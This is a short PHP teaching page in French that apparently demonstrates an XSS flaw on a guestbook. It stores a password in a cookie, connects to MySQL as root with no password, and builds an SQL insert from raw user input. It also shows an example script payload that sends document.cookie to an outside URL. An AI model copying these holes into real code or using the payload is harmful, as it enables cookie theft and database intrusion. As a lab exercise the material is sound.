<?php
setcookie('pwd','admin123');
$pdo = new PDO("mysql:host=localhost;dbname=tpinjection", 'root','');
if(isset($_POST['ajouterMot'])){
    $mot = $_POST['mot'];
    $pdo->query("INSERT INTO livredor VALUES ('', '$mot')");
}
 
?>
 
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
<h1>Faille XSS</h1>


<?php
    // Afficher les entrées du livre d'or
"<h3>Livre d'or</h3>";


$selectall = $pdo->query("SELECT * FROM livredor");
$result = $selectall->fetchALL();
foreach ($result as $ligne){
    echo "<p>" . htmlspecialchars($ligne['mot']) . "</p>";
    }
 
?>
 
<h3>Livre d'or</h3>
<form method="post" action="#">
    Mon mot : <textarea name="mot"></textarea><br>
    <input type="submit" value="Ajouter mon mot" name="ajouterMot">
</form>
 
<p> Ce site stocke votre mot de passe dans un cookie</p>
<h3>Exemple d'attaque XSS</h3>
<input style="width:100%" value="<script>document.location=\'https://github.com/pirahna93/pirahna93.github.io.git\'+document.cookie</script>">
<p>En ajoutant ce srcipt comme entre du livre d'or;
    <ul>
        <li>vous créez une redirection vers mon script malveillant</li>
   
</body>
</html>